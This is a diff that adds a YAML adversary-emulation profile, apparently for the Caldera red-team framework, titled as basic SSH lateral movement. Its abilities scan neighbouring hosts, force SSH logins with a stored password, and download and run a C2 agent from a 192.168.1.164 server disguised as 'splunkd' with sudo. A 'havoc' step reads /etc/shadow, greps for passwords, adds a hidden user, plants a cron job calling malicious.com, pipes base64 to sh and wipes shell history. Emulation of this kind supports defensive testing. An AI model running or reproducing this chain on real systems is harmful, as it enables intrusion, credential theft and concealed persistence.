@@ -1,0 +1,73 @@
+id: 4606b5b3-2607-4c01-b75b-a08a617df748
+name: [001] Basic Later Scen
+description: Basic SSH Lateral Moverment
+objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
+atomic_ordering:
+- fae9d69e-6e82-45d1-bc2d-1717f7b20ad8
+- 552a0095-473a-4529-b9be-2aab5272f4a1
+- 7bc824df-fc84-412b-81df-321fbad00240
+- 8528dceb-4a25-42ee-a5e8-50530d240aa4
+abilities:
+ fae9d69e-6e82-45d1-bc2d-1717f7b20ad8:
+  name:  [001] Host Scan
+  tactic:  discovery
+  technique_name:  "Host Discovery on localhost"
+  technique_id:  T1046
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       $ips = (Get-NetNeighbor -AddressFamily IPv4 | Where-Object {$_.State -in "Reachable","Stale"}).IPAddress; foreach ($ip in $ips) { [Console]::WriteLine($ip.Trim()) }
+ 552a0095-473a-4529-b9be-2aab5272f4a1:
+  name:  [001] SSH and Drop Agent
+  tactic:  lateral-movement
+  technique_name:  "Remote Services: SSH"
+  technique_id:  T1021.004
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       $AskPassBat = "$env:TEMP\askpass.bat";
+                 Set-Content -Path $AskPassBat -Value '@echo #{host.ssh.password}';
+                 
+                 $env:SSH_ASKPASS = $AskPassBat;
+                 $env:DISPLAY = "dummy:0";
+                 $env:SSH_ASKPASS_REQUIRE = "force";
+                 
+                 $LinuxCmd = "server='http://192.168.1.164:8888'; curl -s -X POST -H 'file:sandcat.go' -H 'platform:linux' `$server/file/download > splunkd; chmod +x splunkd; echo '#{host.ssh.password}' | sudo -S nohup ./splunkd -server `$server -group red -v >/dev/null 2>&1 &";
+                 
+                   ssh -o StrictHostKeyChecking=no soc@#{target.host.ip} $LinuxCmd;
+                 
+                
+                 Remove-Item -Path $AskPassBat -ErrorAction SilentlyContinue;
+ 7bc824df-fc84-412b-81df-321fbad00240:
+  name:  [001] Discover on Ubuntu victim
+  tactic:  discovery
+  technique_name:  "System Information Discovery"
+  technique_id:  T1082
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       
+                 whoami;
+                 id;
+                 uname -a;
+                 cat /etc/os-release;
+ 8528dceb-4a25-42ee-a5e8-50530d240aa4:
+  name:  [001] Linux System Havoc
+  tactic:  execution
+  technique_name:  "Command and Scripting Interpreter: Unix Shell"
+  technique_id:  T1059.004
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       echo "========== [BẮT ĐẦU] KÍCH HOẠT CHIẾN DỊCH NHIỄU LOẠN ==========";
+                 cat /etc/shadow | head -n 5 2>/dev/null || echo "Log auditd da ghi nhan";
+                 grep -rnw '/etc/' -e 'password' 2>/dev/null | head -n 15;
+                 useradd -M -s /bin/false sys_update_agent 2>/dev/null || true;
+                 echo "* * * * * root curl -s http://malicious.com" > /etc/cron.d/fake_c2 2>/dev/null;
+                 echo "aWQgJiYgdW5hbWUgLWE=" | base64 -d | sh;
+                 history -c && rm -f ~/.bash_history;
+                 echo "========== [KẾT THÚC] ==========";
